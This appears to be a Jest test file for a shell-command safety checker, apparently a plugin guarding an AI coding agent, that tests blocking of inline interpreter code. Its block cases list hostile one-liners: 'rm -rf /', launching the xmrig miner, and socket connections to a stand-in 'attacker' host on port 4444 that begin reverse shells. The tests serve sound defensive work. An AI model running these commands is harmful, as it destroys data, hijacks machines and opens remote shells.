'use strict';
const path = require('path');
process.env.CLAUDE_PLUGIN_ROOT = path.resolve(__dirname, '../..');

jest.resetModules();
const { checkCommand } = require('../../lib/check');

const stdConfig = {
  preset: 'standard',
  custom_allowlist: [],
  custom_blocklist: [],
  disabled_checks: [],
  sanitize_sudo: true,
  script_inspection: true,
  use_ask_not_deny: false
};

function isBlocked(cmd, cfg = stdConfig) {
  const r = checkCommand(cmd, cfg);
  return r !== null && r.blocked === true;
}

describe('v1.1 — P3: python -c inline code inspection', () => {
  const blockCases = [
    'python -c "import os; os.system(\'id\')"',
    'python3 -c "import os; os.system(\'rm -rf /\')"',
    'python -c "__import__(\'os\').system(\'id\')"',
    'python3 -c "import subprocess; subprocess.run([\'xmrig\'])"',
    'python -c "import socket,subprocess,os; s=socket.socket()"',
    'python3 -c "exec(\'import os\')"',
    'python -c "eval(\'__import__(\\"os\\").system(\\"id\\")\')"',
  ];
  for (const cmd of blockCases) {
    test(`blocks: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(true);
    });
  }

  const allowCases = [
    'python -c "print(1+1)"',
    'python3 -c "print(\'hello\')"',
    'python -c "import json; print(json.dumps({\'a\': 1}))"',
    'python3 -c "import math; print(math.pi)"',
    'python -c "import sys; print(sys.version)"',
    'python3 -c "import datetime; print(datetime.datetime.now())"',
  ];
  for (const cmd of allowCases) {
    test(`allows: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(false);
    });
  }
});

describe('v1.1 — P3: node -e inline code inspection', () => {
  const blockCases = [
    'node -e "require(\'child_process\').exec(\'id\')"',
    'node -e "require(\'child_process\').execSync(\'rm -rf /\')"',
    'node -e "const net = require(\'net\'); net.createConnection(...)"',
    'node -e "const {spawn} = require(\'child_process\'); spawn(\'xmrig\')"',
  ];
  for (const cmd of blockCases) {
    test(`blocks: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(true);
    });
  }

  const allowCases = [
    'node -e "console.log(\'hello\')"',
    'node -e "console.log(1+1)"',
    'node -e "const json = require(\'fs\').readFileSync(\'pkg.json\', \'utf8\'); console.log(JSON.parse(json).name)"',
  ];
  for (const cmd of allowCases) {
    test(`allows: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(false);
    });
  }
});

describe('v1.1 — P3: perl/ruby/php inline inspection', () => {
  const blockCases = [
    "perl -e 'system(\"id\")'",
    "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'",
    "ruby -e 'system(\"id\")'",
    "ruby -rsocket -e 'TCPSocket.open(\"attacker\", 4444)'",
    "php -r 'system(\"id\");'",
    "php -r '$sock = fsockopen(\"attacker\", 4444);'",
  ];
  for (const cmd of blockCases) {
    test(`blocks: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(true);
    });
  }

  const allowCases = [
    "perl -e 'print \"hello\\n\"'",
    "ruby -e 'puts 1+1'",
    "php -r 'echo \"hello\";'",
  ];
  for (const cmd of allowCases) {
    test(`allows: ${cmd}`, () => {
      expect(isBlocked(cmd)).toBe(false);
    });
  }
});
